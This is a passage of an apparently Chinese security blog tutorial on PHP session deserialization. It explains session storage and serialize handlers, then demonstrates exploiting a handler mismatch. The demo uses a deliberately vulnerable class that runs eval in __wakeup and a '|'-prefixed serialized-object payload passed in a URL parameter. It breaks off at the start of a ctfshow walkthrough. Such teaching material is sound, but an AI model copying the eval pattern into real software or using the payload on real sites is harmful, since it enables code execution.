@@ -1,0 +1,731 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="session反序列化"><title>浅谈session反序列化</title><link rel=canonical href=https://baozongwi.xyz/p/session-deserialization-discussion/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="浅谈session反序列化"><meta property='og:description' content="session反序列化"><meta property='og:url' content='https://baozongwi.xyz/p/session-deserialization-discussion/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='姿势'><meta property='article:tag' content='session'><meta property='article:published_time' content='2024-09-11T16:15:57+00:00'><meta property='article:modified_time' content='2024-09-11T16:15:57+00:00'><meta name=twitter:title content="浅谈session反序列化"><meta name=twitter:description content="session反序列化"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#概念>概念</a><ol><li><a href=#session-本身机制>session 本身机制</a></li><li><a href=#为啥要用session>为啥要用session</a></li><li><a href=#session的产生和储存>session的产生和储存</a></li></ol></li><li><a href=#session反序列化>session反序列化</a></li><li><a href=#demo>Demo</a><ol><li><a href=#demo-1>Demo 1</a></li><li><a href=#demo-2>Demo 2</a></li><li><a href=#demo-3>Demo 3</a></li></ol></li><li><a href=#再思考>再思考</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/session-deserialization-discussion/>浅谈session反序列化</a></h2><h3 class=article-subtitle>session反序列化</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-09-11T16:15:57Z>Sep 11, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 518 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>这几天好多奇怪的事情，让我不得不放下一些东西，哎哟，把这个<code>session</code>反序列化拿下就去看<code>GC</code>回收机制</p><h1 id=0x02-question>0x02 question</h1><h2 id=概念>概念</h2><h3 id=session-本身机制>session 本身机制</h3><blockquote><p><code>session</code>（会话）是服务器端用于在用户访问网站时保存信息的一种机制。它允许在多个页面请求之间共享和持久化数据，以便追踪用户的状态或存储临时信息。</p></blockquote><p>那么从这里也可以看出来有时候我们写脚本明明可以直接利用<code>requests</code>,但是却要写成这样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=为啥要用session>为啥要用session</h3><p>大家都知道我们访问网站时，使用的协议是<strong>http(https)</strong>,但是HTTP 是一种<strong>无状态协议</strong>，也就是说，每次请求都是独立的，服务器不会记得上一次请求的信息。因此，<code>session</code> 被用来弥补这个缺点，帮助服务器跟踪用户状态。</p><p>那么是通过什么来跟踪的呢?这里就是<strong>Session ID 生成与存储</strong></p><p>当用户首次访问这个网站时，会话就开始了，此时就会产生一个独一无二的ID，然后产生了<code>cookie</code>，<code>cookie</code>是一个缓存用于一定时间的身份验证，在同一域名下面是全局的，所以说在同一域名下的页面都可以访问到<code>cookie</code>,但是大家都知道<code>cookie</code>我们是可以进行修改的,所以<code>cookie</code>和<code>session</code>有本质的不同</p><ul><li><strong>Session</strong>：数据存储在服务器端，客户端仅保存一个唯一的会话 ID，用于与服务器通信。</li><li><strong>Cookie</strong>：数据存储在客户端浏览器中，服务器不存储这些数据。</li></ul><h3 id=session的产生和储存>session的产生和储存</h3><blockquote><p><strong>session_start()</strong> 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。</p><p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话处理程序的 open 和 read 回调函数。 会话处理程序可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <a class=link href=https://www.php.net/manual/zh/function.session-set-save-handler.php target=_blank rel=noopener>session_set_save_handler()</a> 设定的用户自定义会话处理程序。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p></blockquote><p>这里直接给官方文档的描述了，那么细心看的师傅会发现这里有反序列化，也就是我们的利用点(等会说)</p><p>那么我们写个Demo来看看是怎么存储的路径在哪里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
+</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>session_id</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s2>&#34;PHPSESSID&#34;</span><span class=p>];</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/session-deserialization-discussion/QQ20240912-111641.png width=1356 height=774 loading=lazy alt=1></p><p><img src=/p/session-deserialization-discussion/QQ20240912-111713.png width=1612 height=355 loading=lazy alt=2></p><p>可以看到是保存在临时文件目录里面</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php5</span><span class=o>/</span><span class=n>sess_PHPSESSID</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php7</span><span class=o>/</span><span class=n>sess_PHPSESSID</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=n>sess_PHPSESSID</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>sess_PHPSESSID</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>sessions</span><span class=o>/</span><span class=n>sess_PHPSESSED</span>
+</span></span></code></pre></td></tr></table></div></div><p>这些是常见的保存位置</p><p>我把cookie进行修改之后也是进行了部分的变化</p><p><img src=/p/session-deserialization-discussion/QQ20240912-112606.png width=905 height=280 loading=lazy alt=3></p><p><img src=/p/session-deserialization-discussion/QQ20240912-112611.png width=849 height=242 loading=lazy alt=4></p><p>那么我们再来看看<code>php.ini</code>中对<code>session</code>的配置</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>session</span><span class=o>.</span><span class=nx>save_path</span> <span class=o>=</span> <span class=s2>&#34;/tmp&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>#session保存到/tmp目录
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>session</span><span class=o>.</span><span class=nx>save_handler</span> <span class=o>=</span> <span class=nx>files</span>
+</span></span><span class=line><span class=cl><span class=c1>#session的存储方式。这里是存储为文件
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>session</span><span class=o>.</span><span class=nx>serialize_handler</span> <span class=o>=</span> <span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=c1>#session默认的序列化引擎是php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>session</span><span class=o>.</span><span class=nx>auto_start</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=c1>#session是否默认打开。即是否默认开启session_start()
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>sess_sessionid</span>
+</span></span><span class=line><span class=cl><span class=c1>#session默认是以sess_随机字符串命名
+</span></span></span></code></pre></td></tr></table></div></div><p>其中也提到了重要知识session的序列化引擎，其实是有三个引擎</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值
+</span></span></code></pre></td></tr></table></div></div><p>写个Demo具体看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.serialize_handler&#39;</span><span class=p>,</span> <span class=s1>&#39;php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>// ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);
+</span></span></span><span class=line><span class=cl><span class=c1>// ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;bao&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php:  bao|s:2:&#34;18&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>php_binary:       baos:2:&#34;18&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>php_serialize(php&gt;5.5.4):        a:1:{s:3:&#34;bao&#34;;s:2:&#34;18&#34;;}
+</span></span></code></pre></td></tr></table></div></div><h2 id=session反序列化>session反序列化</h2><p>刚才我们看了<code>session_start()</code>的官方文档，当会话开始时，session_start()即会话开始时。session就会通过指定的序列化引擎将<code>$_SESSION</code>序列化。然后放入文件进行存储。那么当我们再次开启对话的时候他也会进行自动的反序列化来填充<code>$_SESSION</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>session_start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=c1>#session_start()-&gt;读取session文件内容-&gt;反序列化
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;test&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>#serialize($_SESSION)-&gt;存入文件
+</span></span></span></code></pre></td></tr></table></div></div><p>那么如果此时开发者使用的引擎与默认引擎不同，是不是就会产生歧义，此时我们利用数据的存储形式不同的漏洞是不是就可以任意触发魔术方法进行利用了</p><p>也就是说，<strong>Session反序列化都是序列化引擎不一致导致存在安全问题</strong></p><h2 id=demo>Demo</h2><h3 id=demo-1>Demo 1</h3><p><strong>1.php</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.serialize_handler&#39;</span><span class=p>,</span> <span class=s1>&#39;php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p><strong>2.php</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.serialize_handler&#39;</span><span class=p>,</span> <span class=s1>&#39;php_serialize&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;test&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;test&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;test&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>刚才提到了漏洞的出现就是因为引擎的不同，所以这里写了两个文件，一个是使用的<code>php_serialize</code>另一个是<code>php</code></p><p>序列化界面是<code>php</code>，就代表着等会进行反序列化是<code>|</code>后面会认为是序列化数据</p><p>传参解密是<code>php_serialize</code>,代表着进行序列化是<code>json</code>格式保存</p><p>那么写个简单的<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;phpinfo();&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Test</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>/*</span>
+</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Test&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;code&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;phpinfo();&#34;</span><span class=p>;}</span>
+</span></span></code></pre></td></tr></table></div></div><p>传参为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://localhost/2.php?test=|O:4:&#34;Test&#34;:1:{s:4:&#34;code&#34;;s:10:&#34;phpinfo();&#34;;}
+</span></span></code></pre></td></tr></table></div></div><p>此时<code>sess_baozongwi</code>文件内容为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a:1:{s:4:&#34;test&#34;;s:45:&#34;|O:4:&#34;Test&#34;:1:{s:4:&#34;code&#34;;s:10:&#34;phpinfo();&#34;;}&#34;;}
+</span></span></code></pre></td></tr></table></div></div><p>那么<code>php</code>引擎反序列化时会将<code>a:1:{s:4:"test";s:45:"</code>认为是键名，此时访问<code>/1.php</code></p><p>发现成功反序列化</p><p><img src=/p/session-deserialization-discussion/QQ20240912-130314.png width=1689 height=785 loading=lazy alt=4></p><h3 id=demo-2>Demo 2</h3><p><strong>ctfshow web263</strong></p><p>一个简单的审计<code>session</code></p><p><code>index.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
